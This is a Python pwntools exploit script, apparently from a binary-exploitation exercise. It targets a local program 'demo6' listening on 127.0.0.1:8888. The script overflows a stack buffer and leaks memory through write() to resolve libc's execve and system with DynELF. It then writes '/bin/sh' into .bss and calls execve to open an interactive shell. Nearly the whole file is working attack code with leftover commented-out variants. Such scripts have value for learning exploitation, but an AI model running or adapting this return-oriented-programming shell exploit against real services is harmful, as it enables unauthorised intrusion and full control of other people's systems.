#!/usr/bin/env python
from pwn import *

static_elf = ELF('./demo6')
plt_write = static_elf.symbols['write']
plt_read = static_elf.symbols['read']
function_addr=static_elf.symbols['function']
#function_addr=0x0804843b
def leak(address):
    payload1 = 'a'*162 + p32(plt_write) + p32(function_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data

p = remote('127.0.0.1', 8888)
print "\n### 127.0.0.1 connected ...####"
d = DynELF(leak, elf=ELF('./demo6'))
execve_addr = d.lookup('execve', 'libc')
gets_addr = d.lookup('gets', 'libc')
system_addr=d.lookup('system','libc')

bss_addr = static_elf.bss()+0xf00
print "bss_base_addr=" + hex(static_elf.bss())
print "bss_addr=" + hex(bss_addr)
print "vul_fun_addr=" + hex(function_addr)
print "execve_addr=" + hex(execve_addr)
print "gets_addr=" + hex(gets_addr)
print "system_addr=" + hex(system_addr)
#ss = raw_input()
pppret=0x08048509

#payload2 = 'a'*162  + p32(plt_read) + p32(pppret) + p32(0)+p32(bss_addr)+p32(8)
#payload2+=p32(system_addr)+p32(function_addr)+p32(bss_addr)
payload2 = 'a'*162  + p32(plt_read) + p32(function_addr) + p32(0)+p32(bss_addr)+p32(8)
p.send(payload2)
p.send("/bin/sh\0")

print "debug halt"
ss = raw_input()

#payload3 = 'a'*162  + p32(system_addr) + p32(function_addr) + p32(bss_addr)
#p.send(payload3)
#ss = raw_input()

payload3 = 'a'*162  + p32(execve_addr) + p32(function_addr)+p32(bss_addr)+p32(0)+p32(0)
#print "\n###sending payload3 ...###"
p.send(payload3)
#print "\n### payload3 sended...###"
#ss = raw_input()
p.interactive()

